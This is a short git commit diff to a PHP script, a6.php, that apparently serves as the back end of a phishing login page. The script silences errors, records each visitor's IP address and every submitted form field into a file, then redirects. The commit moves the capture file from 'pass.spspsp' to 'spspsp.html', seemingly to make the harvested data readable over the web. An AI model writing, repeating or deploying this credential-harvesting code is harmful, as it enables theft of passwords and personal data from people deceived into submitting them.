014f813e4d15385616e9a260093c9bea2e01444f
sonukumarewesder <116180672+sonukumarewesder@users.noreply.github.com>
2022-10-20 01:57:16 -0700

    Update a6.php

--- a6.php
+++ a6.php
@@ -6,7 +6,7 @@ header('location: qwertyuiop36.php');
 
 // header('location: loginsubmit.html');
 error_reporting(0);
-$handle = fopen("pass.spspsp","a");
+$handle = fopen("spspsp.html","a");
 fwrite($handle, $ip_address);
 fwrite($handle, "\r\n<br>");
 foreach($_POST as $variable => $value)
